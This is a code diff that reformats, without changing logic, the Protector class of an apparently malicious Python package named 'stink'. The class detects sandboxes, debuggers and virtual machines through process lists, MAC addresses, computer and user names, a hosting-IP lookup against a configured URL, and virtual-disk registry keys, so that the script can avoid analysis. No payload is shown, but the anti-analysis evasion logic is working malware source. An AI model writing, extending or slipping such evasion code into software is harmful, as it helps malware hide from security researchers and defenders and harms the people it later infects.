@@ -6,7 +6,14 @@ from getpass import getuser
 from os import path, getenv
 from urllib.request import urlopen
 from string import ascii_uppercase, ascii_lowercase, digits
-from winreg import OpenKey, QueryInfoKey, QueryValueEx, EnumKey, HKEY_LOCAL_MACHINE, KEY_READ
+from winreg import (
+    OpenKey,
+    QueryInfoKey,
+    QueryValueEx,
+    EnumKey,
+    HKEY_LOCAL_MACHINE,
+    KEY_READ,
+)
 
 from stink.enums import Protectors
 from stink.modules import System, Processes
@@ -17,8 +24,8 @@ class Protector:
     """
     Protects the script from virtual machines and debugging.
     """
-    def __init__(self, protectors: List[Protectors] = None):
 
+    def __init__(self, protectors: List[Protectors] = None):
         if protectors is None:
             self.__protectors = [Protectors.disable]
         else:
@@ -37,7 +44,7 @@ class Protector:
         Returns:
         - str: Random string.
         """
-        return ''.join(choices(ascii_uppercase + ascii_lowercase + digits, k=length))
+        return "".join(choices(ascii_uppercase + ascii_lowercase + digits, k=length))
 
     def __check_processes(self) -> bool:
         """
@@ -50,7 +57,6 @@ class Protector:
         - bool: True or False.
         """
         for process in Processes.get_processes_list():
-
             if process[0] not in self.__config.Tasks:
                 continue
 
@@ -68,7 +74,10 @@ class Protector:
         Returns:
         - bool: True or False.
         """
-        return ':'.join(findall("..", "%012x" % getnode())).lower() in self.__config.MacAddresses
+        return (
+            ":".join(findall("..", "%012x" % getnode())).lower()
+            in self.__config.MacAddresses
+        )
 
     def __check_computer(self) -> bool:
         """
@@ -105,7 +114,14 @@ class Protector:
         - bool: True or False.
         """
         try:
-            return urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8").lower().strip() == "true"
+            return (
+                urlopen(url=self.__config.IPUrl, timeout=3)
+                .read()
+                .decode("utf-8")
+                .lower()
+                .strip()
+                == "true"
+            )
         except:
             return False
 
@@ -137,11 +153,18 @@ class Protector:
         - bool: True or False.
         """
         try:
+            with OpenKey(
+                HKEY_LOCAL_MACHINE,
+                r"SYSTEM\CurrentControlSet\Services\Disk\Enum",
+                0,
+                KEY_READ,
+            ) as reg_key:
+                value = QueryValueEx(reg_key, "0")[0]
 
-            with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum", 0, KEY_READ) as reg_key:
-                value = QueryValueEx(reg_key, '0')[0]
-
-                if any(item.lower() in value.lower() for item in self.__config.RegistryEnums):
+                if any(
+                    item.lower() in value.lower()
+                    for item in self.__config.RegistryEnums
+                ):
                     return True
 
         except:
@@ -149,18 +172,19 @@ class Protector:
 
         reg_keys = [
             r"SYSTEM\CurrentControlSet\Enum\IDE",
-            r"System\CurrentControlSet\Enum\SCSI"
+            r"System\CurrentControlSet\Enum\SCSI",
         ]
 
         for key in reg_keys:
             try:
-
                 with OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ) as reg_key:
                     count = QueryInfoKey(reg_key)[0]
 
                     for item in range(count):
-
-                        if not any(value.lower() in EnumKey(reg_key, item).lower() for value in self.__config.RegistryEnums):
+                        if not any(
+                            value.lower() in EnumKey(reg_key, item).lower()
+                            for value in self.__config.RegistryEnums
+                        ):
                             continue
 
                         return True
@@ -190,40 +214,59 @@ class Protector:
             return
 
         try:
-
             checks = [
                 {
                     "method": self.__check_processes,
-                    "status": any(item in self.__protectors for item in [Protectors.processes, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.processes, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_mac_address,
-                    "status": any(item in self.__protectors for item in [Protectors.mac_address, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.mac_address, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_computer,
-                    "status": any(item in self.__protectors for item in [Protectors.computer, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.computer, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_user,
-                    "status": any(item in self.__protectors for item in [Protectors.user, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.user, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_hosting,
-                    "status": any(item in self.__protectors for item in [Protectors.hosting, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.hosting, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_http_simulation,
-                    "status": any(item in self.__protectors for item in [Protectors.http_simulation, Protectors.all])
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.http_simulation, Protectors.all]
+                    ),
                 },
                 {
                     "method": self.__check_virtual_machine,
-                    "status": any(item in self.__protectors for item in [Protectors.virtual_machine, Protectors.all])
-                }
+                    "status": any(
+                        item in self.__protectors
+                        for item in [Protectors.virtual_machine, Protectors.all]
+                    ),
+                },
             ]
 
             for check in checks:
-
                 if check["status"] is False:
                     continue
 
